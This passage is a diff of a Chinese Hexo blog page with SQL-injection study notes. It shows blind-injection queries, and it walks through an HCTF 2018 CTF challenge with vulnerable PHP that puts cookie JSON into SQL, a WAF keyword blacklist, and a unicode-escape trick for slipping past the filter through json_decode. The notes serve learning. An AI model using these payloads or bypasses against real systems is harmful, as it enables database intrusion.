+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1 and greatest(ascii(substr(database(),2,1)),101)=101; // greatest()返回最大值</span><br><span class="line">select * from table_name where id = 1 and least(ascii(substr(database(),2,1)),101)=101; // least()返回最小值</span><br></pre></td></tr></table></figure>
 
-    <footer class="post-footer">
-      
+<h5 id="最近学习"><a href="#最近学习" class="headerlink" title="最近学习"></a>最近学习</h5><p>最近看官方hctf2018 wp学习了一下，这里记录下。<br>里面有道本义是bool盲注的题，结果可利用json反序列化unicode绕过waf的漏洞。<br>php审计一下，发现漏洞点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过爆破发现$login_data[‘admin_pass’]=65时可以成功登陆。<br>所以可利用bool注入，通过登陆状态来判断语句是否正确。<br>审计时发现对$_GET、$_POST、$_COOKIE进行了过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|and|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因为过滤了or所以不能用information_schema库来查询，可用innodb_table_stats和innodb_index_stats这两张表来查询表名。<br>脚本参考官方wp:<a href="https://bysec.io/hctf/writeup.html" target="_blank" rel="noopener">https://bysec.io/hctf/writeup.html</a><br>但是这题可利用json_decode()解码unicode的特性实现时间盲注。<br>只要把被过滤的关键字部分字母替换成unicode编码即可。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span> <span class="comment"># \u0075nion</span></span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://yoursite.com">ll</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://yoursite.com/2019/03/04/sql注入学习/">http://yoursite.com/2019/03/04/sql注入学习/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
         <div class="post-tags">
-          
-            <a href="/tags/sql/" rel="tag"># sql</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/03/04/annoying class/" rel="next" title="annoying class wp">
-                <i class="fa fa-chevron-left"></i> annoying class wp
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/01/php反序列化/" rel="prev" title="php反序列化">
-                php反序列化 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-
-
-
-        </div>
+            <a href="/tags/sql/">sql</a>
+            </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
+        <nav class="post-nav"><a class="prev" href="/2019/04/01/php反序列化/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">php反序列化</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2019/03/04/annoying class/">
+        <span class="next-text nav-default">annoying class wp</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
 
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">ll</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#基础"><span class="nav-number">1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#union注入"><span class="nav-number">2.</span> <span class="nav-text">union注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错注入"><span class="nav-number">3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bool注入"><span class="nav-number">4.</span> <span class="nav-text">bool注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注"><span class="nav-number">5.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他"><span class="nav-number">6.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一些绕过技巧"><span class="nav-number">7.</span> <span class="nav-text">一些绕过技巧</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最近学习"><span class="nav-number">8.</span> <span class="nav-text">最近学习</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
   </span>
-  <span class="author" itemprop="copyrightHolder">ll</span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
 
-  
+  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">ll</span>
+  </span>
 </div>
+</footer>
 
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
       </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
 </body>
 </html>
